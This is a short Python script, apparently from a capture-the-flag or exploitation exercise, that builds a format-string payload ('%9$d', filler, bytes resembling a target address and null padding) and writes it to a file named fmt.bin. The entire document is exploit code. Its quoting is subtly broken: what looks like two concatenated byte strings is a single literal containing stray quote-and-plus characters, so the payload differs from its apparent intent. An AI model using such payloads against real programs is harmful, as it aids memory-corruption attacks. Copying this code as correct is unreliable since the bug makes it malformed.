#!/usr/bin/env python3

payload = b"%9$dAAAA' + b'\x58\x40\x40" + b'\0' * 5

with open("fmt.bin", "wb") as f:
    f.write(payload)
